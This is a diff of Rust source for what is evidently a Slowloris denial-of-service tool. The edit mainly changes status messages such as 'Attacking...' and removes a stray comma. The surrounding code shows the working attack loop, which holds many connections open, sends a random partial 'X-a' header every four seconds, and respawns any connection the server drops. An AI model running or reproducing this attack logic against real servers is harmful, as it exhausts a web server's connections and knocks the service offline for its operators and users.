@@ -91,18 +91,17 @@ pub fn do_loris(url: &str) -> Result<(), LorisError> {
 
     let timeout = 4000;
     loop {
-        println!("start");
+        println!("Attacking...");
         for connection in &mut connections {
             let loris_header = get_loris_header();
             let res = connection.write_all(&loris_header);
             if res.is_err() {
-                println!("Connection closed!");
+                println!("Timeout, reseting connection...");
                 let mut new_connection = spawn_connection(&url);
                 std::mem::swap(connection, &mut new_connection);
-            } else {
-                println!("Sleeping! zZzZzZ");
             }
         }
+        println!("Done!");
         thread::sleep(Duration::from_millis(timeout));
     }
 }
@@ -138,7 +137,7 @@ fn get_init_header(url: &Url) -> Vec<u8> {
 }
 
 fn get_loris_header() -> Vec<u8> {
-    format!("X-a: {}\r\n", rand::random::<u32>(),)
+    format!("X-a: {}\r\n", rand::random::<u32>())
         .as_bytes()
         .to_vec()
 }
